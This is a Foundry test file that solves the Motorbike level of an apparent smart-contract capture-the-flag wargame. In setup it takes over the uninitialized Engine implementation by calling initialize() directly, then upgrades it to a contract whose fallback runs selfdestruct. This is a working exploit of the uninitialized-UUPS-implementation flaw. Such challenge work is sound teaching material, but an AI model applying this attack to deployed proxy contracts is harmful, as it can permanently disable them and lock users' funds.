// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Engine} from "../../src/25/Motorbike.sol";
import {MotorbikeFactory} from "src/25/MotorbikeFactory.sol";
import {console, Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import "../../src/helpers/Address-06.sol";


contract MotorbikeTest is Test {
    Engine public engineContract;
    address public engine;
    address payable public instance;

    address public player = address(1);
    address public levelFactory;


    function setUp() external {

        levelFactory = address(new MotorbikeFactory());
        instance = payable(address(MotorbikeFactory(levelFactory).createInstance(player)));
        engine = address(uint256(vm.load(instance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        engineContract = Engine(engine);

        // selfdestruct doesn't take effect until the call is over, which it isn't until the test is over.
        // We have to code the exploit inside the setUp so that the call containing selfdestruct is already over when we run the test
        engineContract.initialize();
        destructEngine Exploit = new destructEngine();
        address exploit = address(Exploit);
        engineContract.upgradeToAndCall(exploit, "0x");
        
    }

    function testLevelCompleted() public {
        MotorbikeFactory(levelFactory).validateInstance(instance, player);
    }
}


contract destructEngine  {

    fallback() external {

        selfdestruct(address(0));
        // https://github.com/foundry-rs/foundry/pull/5033
        // super.destroyAccount(address(this), engine);
    }
}